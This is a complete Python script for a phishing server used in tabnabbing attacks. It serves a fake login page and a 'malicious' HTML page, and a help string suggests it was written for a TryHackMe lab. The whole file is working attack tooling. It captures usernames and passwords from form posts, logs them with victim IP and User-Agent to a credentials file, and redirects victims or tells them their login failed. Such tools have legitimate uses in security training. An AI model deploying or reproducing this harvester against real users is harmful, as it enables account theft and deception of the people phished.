#!/usr/bin/env python3
import argparse
import os
import sys
import threading
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime, UTC

def make_handler(login_path, malicious_path, redirect_url, out_path, user_field, pass_field):
    """
    Factory function to create the request handler class with context.
    """
    write_lock = threading.Lock()

    class Handler(BaseHTTPRequestHandler):
        # Quieter access log with UTC-aware timestamps
        def log_message(self, fmt, *args):
            ts = datetime.now(UTC).strftime("%d/%b/%Y:%H:%M:%S %z")
            sys.stderr.write(f"{self.client_address[0]} - - [{ts}] " + (fmt % args) + "\n")

        def _serve_file(self, file_path, content_type="text/html"):
            """Helper function to serve a given file."""
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                msg = f"Error: File not found at {file_path}".encode()
                self.send_response(404)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(msg)))
                self.end_headers()
                self.wfile.write(msg)
            except Exception as e:
                msg = f"Server error: {e}".encode()
                self.send_response(500)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(msg)))
                self.end_headers()
                self.wfile.write(msg)

        def do_GET(self):
            """
            Handles GET requests. Serves malicious.html for that specific path,
            otherwise serves the fake login page.
            """
            if self.path == '/malicious.html':
                print(f"[*] Serving malicious file: {malicious_path}")
                self._serve_file(malicious_path)
            else:
                # Serve the fake login page for '/' or '/login.html' or any other path
                print(f"[*] Serving login page: {login_path}")
                self._serve_file(login_path)

        def do_POST(self):
            """Handles POST requests to capture credentials."""
            length = int(self.headers.get("Content-Length", 0))
            ctype = (self.headers.get("Content-Type") or "").lower()
            body_bytes = self.rfile.read(length)
            body = body_bytes.decode("utf-8", errors="replace")

            user = pwd = ""
            if "application/x-www-form-urlencoded" in ctype:
                fields = parse_qs(body)
                user = (fields.get(user_field) or [""])[0]
                pwd = (fields.get(pass_field) or [""])[0]

            ip = self.client_address[0]
            ua = self.headers.get("User-Agent", "")
            line = f"[{datetime.now(UTC).isoformat()}] ip={ip} ua={ua!r} {user_field}={user!r} {pass_field}={pwd!r}\n"
            
            print("\n" + "="*20)
            print("!!! CREDENTIALS CAPTURED !!!")
            print(line.strip())
            print("="*20 + "\n")

            if out_path:
                with write_lock:
                    with open(out_path, "a", encoding="utf-8") as f:
                        f.write(line)

            if redirect_url:
                self.send_response(302)
                self.send_header("Location", redirect_url)
                self.end_headers()
            else:
                resp = b"Login failed. Please try again."
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)

    return Handler

def main():
    ap = argparse.ArgumentParser(
        description="Serve a fake login page and a malicious script for tabnabbing."
    )
    ap.add_argument("-l", "--login", required=True, help="Path to fake login HTML file.")
    ap.add_argument("-m", "--malicious", required=True, help="Path to malicious HTML file for tabnabbing.")
    ap.add_argument("-p", "--port", type=int, default=8080, help="Port to listen on (default 8080).")
    ap.add_argument("-b", "--bind", default="0.0.0.0", help="IP to bind to (use your THM VPN IP).")
    ap.add_argument("-r", "--redirect", default=None, help="Optional URL to redirect to after capturing credentials.")
    ap.add_argument("-o", "--output", default="creds.txt", help="File to append captured credentials to (default: creds.txt).")
    ap.add_argument("--user-field", default="username", help="Form field name for username (default: username).")
    ap.add_argument("--pass-field", default="password", help="Form field name for password (default: password).")
    args = ap.parse_args()

    if not os.path.exists(args.login):
        print(f"[-] Login file not found: {args.login}", file=sys.stderr)
        sys.exit(1)
    if not os.path.exists(args.malicious):
        print(f"[-] Malicious file not found: {args.malicious}", file=sys.stderr)
        sys.exit(1)

    Handler = make_handler(args.login, args.malicious, args.redirect, args.output, args.user_field, args.pass_field)
    httpd = ThreadingHTTPServer((args.bind, args.port), Handler)
    
    print(f"[+] Starting server on http://{args.bind}:{args.port}/")
    print(f"[+] Serving login page from: {args.login}")
    print(f"[+] Serving malicious page from: {args.malicious}")
    print(f"[+] Logging credentials to console and to: {args.output}")
    if args.redirect:
        print(f"[+] Redirecting after POST to: {args.redirect}")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Shutting down server.")
        httpd.server_close()

if __name__ == "__main__":
    main()

